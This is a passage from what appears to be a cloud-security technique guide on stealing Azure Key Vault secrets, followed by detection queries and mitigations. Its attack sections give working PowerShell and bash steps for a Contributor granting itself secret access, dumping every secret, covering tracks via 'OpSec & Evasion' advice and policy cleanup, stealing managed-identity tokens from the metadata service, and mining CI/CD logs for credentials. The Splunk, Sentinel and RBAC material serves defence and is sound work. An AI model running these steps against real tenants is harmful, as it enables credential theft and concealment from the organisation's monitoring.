- [PowerShell Invoke-WebRequest Documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)

---

### METHOD 2: Privilege Escalation via Access Policy Modification (Datadog Finding)

**Supported Versions:** All Azure regions (affecting vaults using Access Policies instead of RBAC)

**Prerequisites:** Entra ID authentication with "Key Vault Contributor" RBAC role (or equivalent permission to modify Key Vault configuration)

**Difficulty:** Medium (requires understanding of Access Policy structure)

**Note:** This technique exploits a documented-but-not-patched Microsoft design: "Key Vault Contributor" role can modify access policies. Microsoft updated documentation in 2024 to warn users, but provides no blocking control.

---

#### Step 1: Verify Current Access Level

**Objective:** Confirm current principal has "Key Vault Contributor" role (permission to modify policies).

**Command (All Versions):**
```powershell
# Get current user/service principal
$CurrentUser = (Get-AzContext).Account.Id
$CurrentObjectId = (Get-AzADServicePrincipal -UserPrincipalName $CurrentUser).Id

# Check if current user has Contributor role on Key Vault
$VaultName = "prod-keyvault-001"
$ResourceGroupName = "production-rg"

$RoleAssignment = Get-AzRoleAssignment -ResourceGroupName $ResourceGroupName `
    -ResourceName $VaultName `
    -ResourceType "Microsoft.KeyVault/vaults" |
    Where-Object {$_.ObjectId -eq $CurrentObjectId}

if ($RoleAssignment.RoleDefinitionName -match "Contributor|Owner") {
    Write-Host "[+] Current user has $($RoleAssignment.RoleDefinitionName) role - Escalation possible!" -ForegroundColor Green
} else {
    Write-Host "[-] Current user role: $($RoleAssignment.RoleDefinitionName) - Cannot escalate" -ForegroundColor Red
}
```

**Expected Output (Vulnerable):**
```
[+] Current user has Contributor role - Escalation possible!
```

**Expected Output (Secure):**
```
[-] Current user role: Reader - Cannot escalate
```

---

#### Step 2: Modify Access Policy to Grant "Secrets Get" Permission

**Objective:** Use Contributor role to add current principal to vault's access policy with "Get" permission for secrets.

**Command (Escalate to Secrets Officer - All Versions):**
```powershell
# Get current principal
$CurrentContext = Get-AzContext
$CurrentUser = $CurrentContext.Account.Id

# Resolve principal object ID
if ($CurrentContext.Account.Type -eq "ServicePrincipal") {
    $ObjectId = (Get-AzADServicePrincipal -ApplicationId $CurrentUser).Id
} else {
    $ObjectId = (Get-AzADUser -UserPrincipalName $CurrentUser).Id
}

# Get vault and current access policies
$VaultName = "prod-keyvault-001"
$ResourceGroupName = "production-rg"
$Vault = Get-AzKeyVault -VaultName $VaultName -ResourceGroupName $ResourceGroupName

# Create new access policy for current user (grant all secret permissions)
$PermissionGranted = "Get", "List", "Set", "Delete", "Recover", "Backup", "Restore"

# Update vault with new access policy
Update-AzKeyVaultAccessPolicy -VaultName $VaultName `
    -ResourceGroupName $ResourceGroupName `
    -ObjectId $ObjectId `
    -PermissionsToSecrets $PermissionGranted

Write-Host "[+] Access policy updated for object ID: $ObjectId"
Write-Host "[+] Permissions granted: $($PermissionGranted -join ', ')"

# Verify escalation
$UpdatedVault = Get-AzKeyVault -VaultName $VaultName -ResourceGroupName $ResourceGroupName
$UpdatedPolicy = $UpdatedVault.AccessPolicies | Where-Object {$_.ObjectId -eq $ObjectId}
Write-Host "[+] Verification - Secrets permissions: $($UpdatedPolicy.PermissionsToSecrets)"
```

**Expected Output (Successful Escalation):**
```
[+] Access policy updated for object ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
[+] Permissions granted: Get, List, Set, Delete, Recover, Backup, Restore
[+] Verification - Secrets permissions: [get, list, set, delete, recover, backup, restore]
```

**What This Means:**
- **Get permission**: Can now read all secrets
- **List permission**: Can enumerate all secrets
- **Set/Delete/Recover**: Can create, destroy, and restore secrets (full control)
- **Escalation complete**: From read-only Contributor to Secrets Officer

**Business Impact:**
- Attacker went from vault management (modify infrastructure) to secret access (read credentials)
- No RBAC change needed; access policy modification hidden in vault configuration logs

**Version Note:** Command identical across all Azure regions.

**OpSec & Evasion:**
- **Detection Risk**: MEDIUM - Creates audit entry "Update Key Vault Access Policy"
- **Evasion**:
  1. Modify policy during business hours (hide in legitimate admin activity)
  2. Add self to existing policy (don't create new) to reduce audit trail visibility
  3. Remove policy immediately after secret extraction (cleanup)

**Troubleshooting:**
- **Error:** "Operation not permitted"
  - **Cause**: Vault using RBAC (not Access Policies); Contributor role doesn't affect RBAC
  - **Fix (All)**: Check: `Get-AzKeyVault -VaultName $VaultName | Select-Object EnableRbacAuthorization`
  - If True = RBAC in use; escalation requires RBAC role assignment (not access policy modification)

- **Error:** "Access policy limit exceeded"
  - **Cause**: Vault already has 16 access policies (Azure limit)
  - **Fix (All)**:
    1. List existing policies: `Get-AzKeyVault -VaultName $VaultName | Select-Object -ExpandProperty AccessPolicies`
    2. Delete least-critical policy: `Remove-AzKeyVaultAccessPolicy -VaultName $VaultName -ObjectId $ObjectIdToDelete`
    3. Retry policy update

**References:**
- [Update-AzKeyVaultAccessPolicy Documentation](https://learn.microsoft.com/en-us/powershell/module/az.keyvault/update-azkeyvaultaccesspolicy)
- [Datadog Blog - Key Vault Access Policy Escalation](https://securitylabs.datadoghq.com/articles/escalating-privileges-to-read-secrets-with-azure-key-vault-access-policies/)

---

#### Step 3: Retrieve Secrets Using Escalated Permissions

**Objective:** Extract secrets using newly granted permissions (same as METHOD 1, Step 2).

**Command (Retrieve All Secrets - All Versions):**
```powershell
# Now that we have Get permission, extract all secrets
$VaultName = "prod-keyvault-001"
$AllSecrets = Get-AzKeyVaultSecret -VaultName $VaultName

$SecretData = @()
foreach ($Secret in $AllSecrets) {
    $Value = Get-AzKeyVaultSecret -VaultName $VaultName -Name $Secret.Name -AsPlainText
    $SecretData += @{Name = $Secret.Name; Value = $Value}
    Write-Host "[+] Retrieved: $($Secret.Name)"
}

Write-Host "`n[+] Total secrets extracted: $($SecretData.Count)"
$SecretData | Format-Table -AutoSize
```

**Expected Output:**
```
[+] Retrieved: app-db-password
[+] Retrieved: app-api-key-stripe
[+] Retrieved: client-secret-adfs
[+] Retrieved: exchange-admin-password
[+] Retrieved: databricks-token
[+] Retrieved: github-pat-deploy

[+] Total secrets extracted: 6

Name                         Value
----                         -----
app-db-password              Server=sqldb.database.windows.net;Database=ProductionDB;...
app-api-key-stripe           sk_live_51HZ7LC2eZvKa46r0N...
client-secret-adfs           a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6...
```

---

#### Step 4: Clean Up (Remove Access Policy)

**Objective:** Remove the escalated access policy to hide the privilege escalation attack.

**Command (All Versions):**
```powershell
# Remove access policy (cleanup after extraction)
$VaultName = "prod-keyvault-001"
$ResourceGroupName = "production-rg"
$ObjectId = (Get-AzADServicePrincipal -ApplicationId $CurrentUser).Id  # Or Get-AzADUser

Remove-AzKeyVaultAccessPolicy -VaultName $VaultName `
    -ResourceGroupName $ResourceGroupName `
    -ObjectId $ObjectId

Write-Host "[+] Access policy removed for object ID: $ObjectId"
Write-Host "[*] Audit trail: entries remain in Azure Activity Log (30-90 day retention)"
```

**Expected Output:**
```
[+] Access policy removed for object ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
[*] Audit trail: entries remain in Azure Activity Log (30-90 day retention)
```

**What This Means:**
- **Cleanup incomplete**: Azure Activity Log still records the policy modification event
- **Detection still possible**: SOC with good monitoring will find the audit trail
- **But**: Less suspicious than leaving elevated permission in place

**References:**
- [Remove-AzKeyVaultAccessPolicy Documentation](https://learn.microsoft.com/en-us/powershell/module/az.keyvault/remove-azkeyvaultaccesspolicy)

---

### METHOD 3: Managed Identity Token Extraction (SSRF Attack from Compute)

**Supported Versions:** All Azure Compute resources (VMs, Functions, Logic Apps, Container Instances, Kubernetes)

**Prerequisites:** Code execution on Azure compute resource with assigned managed identity (with Key Vault access)

**Difficulty:** Medium-High (requires understanding of instance metadata service)

---

#### Step 1: Verify Managed Identity Access from Compute Environment

**Objective:** Confirm current compute environment has assigned managed identity and verify it can access Key Vault.

**Command (From Azure VM/Function/Logic App):**
```powershell
# Test if running in Azure with managed identity
$MetadataUri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net"

try {
    $Response = Invoke-WebRequest -Uri $MetadataUri -Headers @{Metadata="true"} -UseBasicParsing -ErrorAction Stop
    $TokenResponse = $Response.Content | ConvertFrom-Json
    $AccessToken = $TokenResponse.access_token
    Write-Host "[+] Managed Identity Token obtained!" -ForegroundColor Green
    Write-Host "[*] Token preview: $($AccessToken.Substring(0, 50))..."
} catch {
    Write-Host "[-] No managed identity available: $_" -ForegroundColor Red
    exit
}
```

**Expected Output (Vulnerable):**
```
[+] Managed Identity Token obtained!
[*] Token preview: eyJhbGciOiJSUzI1NiIsImtpZCI6IjFjQUZwYjR...
```

**Expected Output (Protected):**
```
[-] No managed identity available: Invoke-WebRequest : The remote server returned an error: (404) Not Found.
```

**What This Means:**
- **Token obtained**: Managed identity is active and accessible
- **Token usable for**: Azure Resource Manager (Key Vault access)
- **No credentials needed**: Token automatically issued by Azure infrastructure

---

#### Step 2: Use Token to Access Key Vault

**Objective:** Authenticate to Azure Key Vault using the managed identity access token.

**Command (Retrieve Secrets with Token):**
```powershell
# Get managed identity token
$MetadataUri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net"
$TokenResponse = Invoke-WebRequest -Uri $MetadataUri -Headers @{Metadata="true"} -UseBasicParsing | ConvertFrom-Json
$AccessToken = $TokenResponse.access_token

# Use token to access Key Vault directly (via REST API)
$VaultName = "prod-keyvault-001"
$SecretName = "app-db-password"

$SecretUri = "https://$VaultName.vault.azure.net/secrets/$SecretName?api-version=2016-10-01"
$Headers = @{Authorization = "Bearer $AccessToken"}

try {
    $SecretResponse = Invoke-WebRequest -Uri $SecretUri -Headers $Headers -UseBasicParsing | ConvertFrom-Json
    $SecretValue = $SecretResponse.value
    Write-Host "[+] Secret retrieved: $SecretValue" -ForegroundColor Green
} catch {
    Write-Host "[-] Access denied: $_" -ForegroundColor Red
}
```

**Expected Output (Successful):**
```
[+] Secret retrieved: Server=sqldb.database.windows.net;Database=ProductionDB;User ID=sa;Password=Sup3rS3cur3P@ss!
```

**Expected Output (Insufficient Permissions):**
```
[-] Access denied: Invoke-WebRequest : The remote server returned an error: (403) Forbidden.
```

**What This Means:**
- **Token accepted**: Managed identity authenticated successfully
- **Secrets retrieved**: Can now use credentials to access dependent systems
- **No credentials in code**: Implicit authentication via Azure infrastructure

---

#### Step 3: Enumerate and Extract All Secrets

**Objective:** List and retrieve all secrets the managed identity has access to.

**Command (List and Extract):**
```powershell
# Get token
$MetadataUri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net"
$TokenResponse = Invoke-WebRequest -Uri $MetadataUri -Headers @{Metadata="true"} -UseBasicParsing | ConvertFrom-Json
$AccessToken = $TokenResponse.access_token

# List all secrets
$VaultName = "prod-keyvault-001"
$ListUri = "https://$VaultName.vault.azure.net/secrets?api-version=2016-10-01"
$Headers = @{Authorization = "Bearer $AccessToken"}

$ListResponse = Invoke-WebRequest -Uri $ListUri -Headers $Headers -UseBasicParsing | ConvertFrom-Json
$Secrets = $ListResponse.value

# Extract each secret
Write-Host "[*] Found $($Secrets.Count) secrets"
foreach ($Secret in $Secrets) {
    $SecretName = $Secret.id.Split('/')[-1]
    $SecretUri = "https://$VaultName.vault.azure.net/secrets/$SecretName?api-version=2016-10-01"
    
    $SecretResponse = Invoke-WebRequest -Uri $SecretUri -Headers $Headers -UseBasicParsing | ConvertFrom-Json
    $SecretValue = $SecretResponse.value
    
    Write-Host "[+] $SecretName = $SecretValue"
}
```

**Expected Output:**
```
[*] Found 6 secrets
[+] app-db-password = Server=sqldb.database.windows.net;Database=ProductionDB;User ID=sa;Password=Sup3rS3cur3P@ss!
[+] app-api-key-stripe = sk_live_51HZ7LC2eZvKa46r0N59a5zX8K0pXR6n3Y8m9O0p1Q2r3S4t5U6v7W8x9Y0z1A2b
[+] client-secret-adfs = a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f
```

---

### METHOD 4: CI/CD Pipeline Secret Extraction via Log Analysis

**Supported Versions:** GitHub Actions, Azure DevOps, GitLab CI, Jenkins (all platforms)

**Prerequisites:** Access to CI/CD logs or artifact storage (often world-readable)

**Difficulty:** Low (secrets often logged unintentionally)

---

#### Step 1: Locate CI/CD Pipeline Logs

**Objective:** Find pipeline logs containing secrets in environment variables or debug output.

**Command (GitHub Actions - Extract from Job Logs):**
```bash
# GitHub Actions logs often expose secrets in workflow output
# If you have repo access:
gh run view RUN_ID --log  # Download logs for a specific run

# Secrets often appear in:
# - Debug output from "run: echo $SECRET"
# - Terraform/Ansible debug mode
# - Docker build logs with ARG secrets
# - pip/npm install logs with token URLs
```

**Command (Azure DevOps - Extract from Pipeline Logs):**
```bash
# Azure DevOps Classic UI:
# Project Settings → Pipelines → [PipelineName] → Logs
# Often contains: "##vso[task.setvariable variable=SECRET]..."

# Via REST API:
$PAT = "your-personal-access-token"
$Org = "contoso"
$Project = "MyProject"
$PipelineId = "123"

$Auth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(":$PAT"))
$Headers = @{Authorization = "Basic $Auth"}

# Get pipeline logs
$Uri = "https://dev.azure.com/$Org/$Project/_apis/pipelines/$PipelineId/runs?api-version=6.0"
$Runs = Invoke-RestMethod -Uri $Uri -Headers $Headers
foreach ($Run in $Runs.value) {
    $LogUri = "https://dev.azure.com/$Org/$Project/_apis/build/builds/$($Run.id)/logs?api-version=6.0"
    $Logs = Invoke-RestMethod -Uri $LogUri -Headers $Headers
    Write-Host $Logs
}
```

**Expected Output:**
```
[pipeline secret exposure]
Setting Secret value in environment
export DB_PASSWORD="Sup3rS3cur3P@ss!"
export API_KEY="sk_live_51HZ7LC..."
Running terraform plan with secrets
...
```

---

#### Step 2: Extract Secrets from Artifacts / Build Output

**Objective:** Find secrets in artifact repositories or container image layers.

**Command (Docker Image Layer Inspection - Extract Secret from Build):**
```bash
# If you find Docker image used by pipeline:
docker history image-name  # Shows layer history

# Secrets often in:
# - RUN export SECRET=value
# - COPY /secrets /app/
# - Compiled binaries with hardcoded secrets

# Extract from running container (if accessible)
docker exec container-id env  # Show environment variables
```

**Command (Artifact Repository - GitHub Packages / npm / PyPI):**
```bash
# If package contains secrets:
npm view package-name  # May show token in registry URL
pip install --verbose package-name  # Often logs auth tokens
```

**Expected Output:**
```
Registry URL: https://npm.pkg.github.com/
Auth token exposed in URL: ghp_1234567890abcdefghijklmnopqrstuvwxyz
```

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Red Team Tests for Azure Credential Theft

- **Atomic Test T1552.001 #15**: "Find Azure credentials on local system"
  - Tests: Search for saved Azure credentials in PowerShell module cache, Azure CLI profiles, etc.
  - Command: `Get-ChildItem -Path "$env:USERPROFILE\.azure" -Recurse`
  - Simulates credential discovery in local configuration

- **Atomic Test T1098.001**: "Create new cloud access key"
  - Tests: Create access keys/credentials on cloud service
  - Simulates persistence via credential creation

- **Atomic Test T1528**: "Steal application access token"
  - Tests: Token extraction from running application or metadata service
  - Simulates managed identity token abuse

**Execution Command:**
```powershell
Invoke-AtomicTest T1552.001 -TestNumbers 15
Invoke-AtomicTest T1098.001 -TestNumbers 1
```

**Reference:**
[Atomic Red Team Azure Tests - GitHub](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/azure-ad-index.md)

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Excessive Secret Retrieval from Key Vault

**Rule Configuration:**
- **Required Index**: `azure_activity` or custom Azure index
- **Required Sourcetype**: `azure:audit` or `azure:activity`
- **Required Fields**: OperationName, CallerIpAddress, CorrelationId, ResultType
- **Alert Threshold**: >= 10 GetSecret operations within 5 minutes
- **Applies To Versions**: All Azure regions

**SPL Query:**
```spl
sourcetype=azure:activity OperationName="GetSecret" ResultType="Success"
| stats count by CallerIpAddress, CorrelationId, UserPrincipalName
| where count >= 10
| fields - count
```

**What This Detects:**
- **OperationName="GetSecret"**: Secret retrieval operations
- **ResultType="Success"**: Successful access (failed attempts less suspicious)
- **count >= 10**: Multiple secrets accessed in short timeframe (abnormal)
- **grouped by IP and user**: Identifies which account/location performing access

**Manual Configuration (Splunk Web):**
1. Go to **Search & Reporting** → **New Alert**
2. Paste query above
3. Run search and verify results
4. Click **Save As** → **Alert**
5. Name: "Excessive Azure Key Vault Secret Access"
6. Trigger: **Per Result**
7. Severity: **High**
8. Action: Send email to SOC

**False Positive Analysis:**
- **Legitimate Activity**: Application startup (loads all secrets at boot), secret rotation scripts
- **Tuning Exclusions**:
  ```spl
  NOT UserPrincipalName IN ("svc_app@contoso.com", "svc_rotation@contoso.com")
  NOT CallerIpAddress IN ("10.0.0.1", "192.168.1.1")  # Known app servers
  ```

---

### Rule 2: Suspicious Key Vault Access Policy Modification

**Rule Configuration:**
- **Required Index**: `azure_activity`
- **Required Sourcetype**: `azure:audit`
- **Alert Threshold**: >= 1 policy modification event (very rare)
- **Applies To Versions**: All Azure regions

**SPL Query:**
```spl
sourcetype=azure:activity OperationName="Update Key Vault Access Policy"
| stats count by UserPrincipalName, CallerIpAddress, ResourceName
```

**What This Detects:**
- **OperationName="Update Key Vault Access Policy"**: Access policy change (should be rare)
- **Alert trigger**: Any occurrence indicates potential escalation attempt

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Mass Secret Retrieval Pattern (Azure Activity Log)

**Rule Configuration:**
- **Required Table**: `AzureActivity`
- **Required Fields**: OperationName, CallerIpAddress, Caller, ResourceGroup, CorrelationId
- **Alert Severity**: **High**
- **Frequency**: Every 5 minutes
- **Lookback**: Last 30 minutes
- **Applies To Versions**: All Azure regions

**KQL Query:**
```kusto
AzureActivity
| where OperationName == "GetSecret" or OperationName == "ListSecrets"
| where ActivityStatus =~ "Success"
| extend Caller = tostring(Caller)
| summarize SecretAccessCount = count(), FirstAccessTime = min(TimeGenerated), LastAccessTime = max(TimeGenerated) by Caller, CallerIpAddress, tostring(Resource)
| where SecretAccessCount >= 10  // Threshold: 10+ secrets in 5 minutes
| project Caller, CallerIpAddress, Resource, SecretAccessCount, FirstAccessTime, LastAccessTime
```

**Manual Configuration (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Mass Secret Retrieval from Key Vault`
   - Severity: High
   - Tactics: Credential Access
4. **Set rule logic Tab:**
   - Paste KQL query above
   - Run every: 5 minutes
   - Lookup data from last: 30 minutes
5. **Incident settings Tab:**
   - Create incidents: **ON**
   - Group by: Same Caller + Same Resource
6. Click **Review + Create**

**Expected Alert Output:**
```
Caller: user@contoso.com
CallerIpAddress: 203.0.113.50
Resource: prod-keyvault-001
SecretAccessCount: 15
FirstAccessTime: 2026-01-06 11:05:22
LastAccessTime: 2026-01-06 11:09:45
```

---

### Query 2: Key Vault Access Policy Escalation Detection

**Rule Configuration:**
- **Required Table**: `AzureActivity`
- **Alert Severity**: **Critical**
- **Frequency**: Real-time (10 minutes)
- **Applies To Versions**: All Azure regions

**KQL Query:**
```kusto
AzureActivity
| where OperationName startswith "Update Key Vault Access Policy"
| where ActivityStatus =~ "Success"
| extend Properties = parse_json(Properties)
| project TimeGenerated, Caller, CallerIpAddress, Resource, Properties
| where Properties.statusCode == 200 or Properties.statusCode == ""
```

**What This Detects:**
- **Policy modification**: Caller updated Key Vault access policy
- **Success status**: Actual privilege change (not just attempt)
- **Alert trigger**: Any successful policy update

---

## 9. AZURE ACTIVITY LOG MONITORING

### Key Vault Data Plane Operations

**Operations to Monitor:**
- **GetSecret**: Retrieve secret value (highest priority)
- **ListSecrets**: Enumerate secrets (reconnaissance)
- **SetSecret**: Create/update secret (post-exploitation)
- **DeleteSecret**: Destroy secret (cleanup/covering tracks)

**Log Source**: Azure Activity Log → AzureActivity table in Sentinel

**Manual Configuration (Enable Diagnostic Logging):**
1. Navigate to **Azure Portal** → **Key Vaults** → Select vault
2. Left menu → **Diagnostic settings**
3. Click **+ Add diagnostic setting**
4. **Logs to enable**:
   - Check: **AuditEvent**
5. **Destination**:
   - Select: **Send to Log Analytics workspace**
   - Choose workspace: Your Sentinel workspace
6. Click **Save**

**Verify Logging:**
```powershell
# Check if diagnostic settings configured
Get-AzDiagnosticSetting -ResourceId "/subscriptions/{subId}/resourcegroups/{rg}/providers/microsoft.keyvault/vaults/{vaultName}"

# Confirm logs appearing in Sentinel
# In Sentinel: Logs → Run query:
# AzureDiagnostics | where ResourceType == "KEYVAULT" | take 10
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### 1.1 Migrate from Access Policies to RBAC

**Objective**: Eliminate the privilege escalation vector where "Key Vault Contributor" can modify access policies to grant themselves secret access.

**Applies To**: All Key Vaults using Access Policies (legacy model)

**Impact**: Prevents Privilege Escalation via Access Policy Modification (METHOD 2)

**Manual Steps (Migrate to RBAC - Azure Portal):**
1. Navigate to **Azure Portal** → **Key Vaults** → Select vault
2. Left menu → **Access Control (IAM)**
3. Click **Properties** (left menu)
4. Scroll to **Access Policy Setting**
5. Select: **Vault access policy → Azure role-based access control**
6. Click **Save**
7. **Old access policies automatically converted to RBAC role assignments**

**Manual Steps (Verify Migration - PowerShell):**
```powershell
$VaultName = "prod-keyvault-001"
$Vault = Get-AzKeyVault -VaultName $VaultName

if ($Vault.EnableRbacAuthorization -eq $true) {
    Write-Host "[+] RBAC enabled successfully" -ForegroundColor Green
} else {
    Write-Host "[-] RBAC not enabled - still using Access Policies" -ForegroundColor Red
}

# Verify RBAC role assignments created
Get-AzRoleAssignment -ResourceGroupName $Vault.ResourceGroupName -ResourceName $VaultName -ResourceType "Microsoft.KeyVault/vaults"
```

**Expected Output (Secure Configuration):**
```
[+] RBAC enabled successfully

RoleDefinitionName              DisplayName                    ObjectType Scope
------------------              -----------                    ---------- -----
Key Vault Secrets User          john.admin@contoso.com         User       /subscriptions/.../prod-keyvault-001
Key Vault Secrets Officer       svc_app@contoso.com            ServicePrincipal /subscriptions/.../prod-keyvault-001
Key Vault Contributor           infra-team@contoso.com         Group      /subscriptions/.../prod-keyvault-001
```

**Benefits of RBAC:**
- ✅ Centralized authorization (integrated with Entra ID)
- ✅ No "Contributor" → "Secrets Officer" escalation possible
- ✅ Integrated with Azure PIM (temporary access with just-in-time approval)
- ✅ Better auditability (single point of authority)
- ✅ Consistent with other Azure services

**Validation Command (Verify Escalation Blocked):**
```powershell
# After RBAC migration, attempt access policy modification:
$VaultName = "prod-keyvault-001"
$ResourceGroupName = "production-rg"
$ObjectId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"

try {
    Update-AzKeyVaultAccessPolicy -VaultName $VaultName -ObjectId $ObjectId -PermissionsToSecrets "Get" -ErrorAction Stop
    Write-Host "[-] Access policy modified - escalation still possible!" -ForegroundColor Red
} catch {
    Write-Host "[+] Access policy modification blocked - RBAC enforced!" -ForegroundColor Green
}
```

**Expected Output (Secure):**
```
[+] Access policy modification blocked - RBAC enforced!
Update-AzKeyVaultAccessPolicy : The operation "Microsoft.KeyVault/vaults/accessPolicies/write" is not allowed
```

**References:**
- [Azure Key Vault RBAC vs Access Policies](https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-access-policy)
- [Migrate to RBAC](https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-migration)

---

#### 1.2 Restrict Key Vault Contributor Role Assignment

**Objective**: Prevent assignment of "Key Vault Contributor" role (which can modify access policies) to untrusted principals.

**Applies To**: All Key Vaults

**Impact**: Prevents access policy escalation even if RBAC partially misconfigured

**Manual Steps (Remove Unnecessary Contributor Assignments - PowerShell):**
```powershell
# Find all Contributor role assignments on Key Vaults
$VaultName = "prod-keyvault-001"
$ResourceGroupName = "production-rg"

$ContributorRoles = Get-AzRoleAssignment -ResourceGroupName $ResourceGroupName `
    -ResourceName $VaultName `
    -ResourceType "Microsoft.KeyVault/vaults" |
    Where-Object {$_.RoleDefinitionName -eq "Contributor"}

Write-Host "Contributor role assignments:"
$ContributorRoles | Select-Object DisplayName, ObjectId, RoleDefinitionName

# Remove unnecessary Contributor assignments
foreach ($Assignment in $ContributorRoles) {
    # Verify it's not a critical infrastructure team
    if ($Assignment.DisplayName -notmatch "infra-team|platform-eng|devops-admins") {
        Write-Host "Removing Contributor for: $($Assignment.DisplayName)"
        Remove-AzRoleAssignment -ObjectId $Assignment.ObjectId `
            -ResourceGroupName $ResourceGroupName `
            -ResourceName $VaultName `
            -ResourceType "Microsoft.KeyVault/vaults" `
            -RoleDefinitionName "Contributor"
    }
}
```

**Manual Steps (Use Azure Policy to Prevent Future Assignments):**
1. Navigate to **Azure Portal** → **Policy**
2. Click **+ Policy Definition** → **Create**
3. **Name**: `Prevent Key Vault Contributor Role`
4. **Rule Logic**:
   ```json
   {
     "if": {
       "allOf": [
         {"field": "type", "equals": "Microsoft.Authorization/roleAssignments"},
         {"field": "Microsoft.Authorization/roleAssignments/roleDefinitionId", "contains": "key-vault-contributor"},
         {"field": "Microsoft.Authorization/roleAssignments/principalType", "equals": "User"}
       ]
     },
     "then": {"effect": "deny"}
   }
   ```
5. Click **Save**

**Validation Command (Check Assignments):**
```powershell
# Verify no Contributor assignments remain
$ContributorCheck = Get-AzRoleAssignment -ResourceGroupName $ResourceGroupName `
    -ResourceName $VaultName `
    -ResourceType "Microsoft.KeyVault/vaults" |
    Where-Object {$_.RoleDefinitionName -eq "Contributor"}

if ($ContributorCheck.Count -eq 0) {
    Write-Host "[+] No Contributor assignments - escalation vector removed!" -ForegroundColor Green
} else {
    Write-Host "[-] Contributor assignments still present - risk remains" -ForegroundColor Red
}
```

**References:**
- [Azure RBAC Built-in Roles](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles)
- [Azure Policy Definition Structure](https://learn.microsoft.com/en-us/azure/governance/policy/concepts/definition-structure)

---

#### 1.3 Enable Diagnostic Logging and Configure Alerts

**Objective**: Capture all Key Vault access operations in logs and alert on suspicious patterns.

**Applies To**: All Key Vaults

**Impact**: Enables detection of secret extraction attempts

**Manual Steps (Enable Diagnostic Logging - Azure Portal):**
1. Navigate to **Key Vault** → **Diagnostic settings**
2. Click **+ Add diagnostic setting**
3. **Name**: `KV-Activity-Logging`
4. **Logs**:
   - Check: **AuditEvent**
5. **Metrics**:
   - Check: **AllMetrics** (optional, for availability monitoring)
6. **Destination details**:
   - Select: **Send to Log Analytics workspace**
   - Workspace: Your Sentinel workspace
7. Click **Save**
8. **Wait 15 minutes** for first events to appear

**Manual Steps (Verify Logging - PowerShell):**
```powershell
# Confirm logging configured
$VaultName = "prod-keyvault-001"
$Vault = Get-AzKeyVault -VaultName $VaultName
$Vault | Get-AzDiagnosticSetting | Format-Table Name, Logs, Metrics

# Verify logs appearing in Sentinel
# In Sentinel → Logs → Run:
# AzureDiagnostics | where ResourceType == "KEYVAULT" | take 20
```

**Manual Steps (Create Alert Rule - Sentinel):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General**:
   - Name: `Key Vault Secret Access Alert`
   - Severity: High
3. **Set rule logic**:
   - Paste KQL from Section 8
   - Frequency: Every 5 minutes
   - Lookback: 30 minutes
4. **Incident settings**:
   - Create incidents: ON
   - Group by: Caller
5. **Automated response**:
   - Create playbook to notify SOC (optional)
6. **Review + Create**

**Expected Results (Logs Appearing):**
```
AzureDiagnostics
| where ResourceType == "KEYVAULT"
| where OperationName in ("GetSecret", "ListSecrets")
| summarize by OperationName, CallerIPAddress, Identity
```

**Validation Command (Test Alert):**
```powershell
# Manually retrieve a secret to trigger log entry
Connect-AzAccount
$Secret = Get-AzKeyVaultSecret -VaultName "prod-keyvault-001" -Name "test-secret"

# Wait 5 minutes, then check Sentinel Logs for new entry
# Query: AzureDiagnostics | where TimeGenerated > ago(10m) | where ResourceType == "KEYVAULT"
```

**References:**
- [Azure Key Vault Monitoring](https://learn.microsoft.com/en-us/azure/key-vault/general/monitor-key-vault)

---

### Priority 2: HIGH

#### 2.1 Implement Automated Secrets Rotation

**Objective**: Invalidate stolen secrets by automatically rotating them every 90 days (stolen credentials expire after rotation period).

**Applies To**: All secrets with regular access patterns (databases, APIs, service accounts)

**Manual Steps (Configure Auto-Rotation - Azure Portal):**
1. Navigate to **Key Vault** → **Secrets**
2. Select secret → Click **Rotation policy**
3. **Enable auto-rotation**: ON
4. **Rotation interval**: 90 days
5. **Click Edit** to configure rotation logic:
   - **Rotation function**: Azure Function / Logic App (must update actual credential in source system)
   - **Notify before expiration**: 30 days
6. **Save**

**Example: Rotation Logic (Azure Function):**
```powershell
# Triggered when secret is about to rotate
# Function must: (1) Generate new secret, (2) Update source system, (3) Store new secret in Key Vault

param($InputObject)

$VaultName = "prod-keyvault-001"
$SecretName = "app-db-password"
$DatabaseServer = "sqldb.database.windows.net"
$DatabaseName = "ProductionDB"
$DatabaseUser = "sa"

# Generate new password
$NewPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})

# Update database
$ConnectionString = "Server=$DatabaseServer;Database=$DatabaseName;User ID=$DatabaseUser;Password=..."
# SQL: ALTER LOGIN sa WITH PASSWORD = '$NewPassword'

# Update Key Vault with new secret
$Secret = ConvertTo-SecureString -String "$NewPassword" -AsPlainText -Force
Set-AzKeyVaultSecret -VaultName $VaultName -Name $SecretName -SecretValue $Secret

Write-Host "[+] Secret rotated successfully"
```

**Validation (Verify Rotation Scheduled):**
```powershell
# Check rotation policy
$Vault = Get-AzKeyVault -VaultName "prod-keyvault-001"
$Secret = Get-AzKeyVaultSecret -VaultName $Vault.VaultName -Name "app-db-password"
$Secret | Select-Object RotationPolicy, Created, Updated
```

**Impact**:
- ✅ Stolen secrets expire after 90 days
